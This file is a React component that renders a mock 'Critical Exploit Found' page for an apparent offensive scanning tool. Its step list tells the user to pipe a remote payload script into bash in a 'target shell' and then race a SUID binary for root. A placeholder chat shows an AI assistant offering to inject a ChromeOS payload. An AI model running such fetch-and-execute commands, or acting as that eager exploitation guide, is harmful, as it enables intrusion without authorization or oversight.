import { useState, useEffect } from 'react'
import { AlertTriangle, Download, Terminal, MessageSquare, CheckCircle, ChevronRight } from 'lucide-react'
import './ExploitPage.css'

export function ExploitPage() {
  const [target, setTarget] = useState('')
  const [activeTab, setActiveTab] = useState('instructions')
  
  useEffect(() => {
    setTarget(localStorage.getItem('scanTarget') || 'Generic Target')
  }, [])

  return (
    <div className="exploit-page">
      <div className="exploit-header">
        <div className="exploit-title">
          <div className="icon-wrapper critical">
            <AlertTriangle size={32} />
          </div>
          <div>
            <h1>Critical Exploit Found</h1>
            <p>Target: {target} | Severity: CRITICAL | Confidence: 100%</p>
          </div>
        </div>
        <button className="download-btn">
          <Download size={18} /> Download Payload
        </button>
      </div>

      <div className="exploit-content">
        <div className="exploit-sidebar">
          <button 
            className={`tab-btn ${activeTab === 'instructions' ? 'active' : ''}`}
            onClick={() => setActiveTab('instructions')}
          >
            <Terminal size={18} /> Instructions
          </button>
          <button 
            className={`tab-btn ${activeTab === 'chat' ? 'active' : ''}`}
            onClick={() => setActiveTab('chat')}
          >
            <MessageSquare size={18} /> AI Assistant
          </button>
        </div>

        <div className="exploit-panel">
          {activeTab === 'instructions' ? (
            <div className="instructions-view">
              <h3>Execution Steps</h3>
              <div className="step-list">
                <div className="step-item completed">
                  <div className="step-icon"><CheckCircle size={16} /></div>
                  <div className="step-content">
                    <h4>1. Prepare Environment</h4>
                    <p>WebContainer has successfully staged the exploit payload in <code>/tmp/payload.bin</code>.</p>
                  </div>
                </div>
                <div className="step-item active">
                  <div className="step-icon">2</div>
                  <div className="step-content">
                    <h4>2. Inject Payload</h4>
                    <p>Run the following command in the target shell to inject the payload:</p>
                    <div className="code-block">
                      <code>curl -sL http://localhost:3000/payload.sh | bash</code>
                    </div>
                  </div>
                </div>
                <div className="step-item">
                  <div className="step-icon">3</div>
                  <div className="step-content">
                    <h4>3. Escalate Privileges</h4>
                    <p>Once injected, the script will attempt to race the SUID binary. Watch for the root prompt.</p>
                  </div>
                </div>
              </div>
            </div>
          ) : (
            <div className="chat-view-placeholder">
              <p>AI Assistant is ready to guide you through the exploitation process.</p>
              {/* Chat component could be reused here */}
              <div className="mock-chat">
                <div className="chat-msg assistant">
                  I have generated the payload specifically for this version of ChromeOS. Are you ready to proceed with injection?
                </div>
                <div className="chat-input-mock">
                  <input type="text" placeholder="Ask about the exploit..." />
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

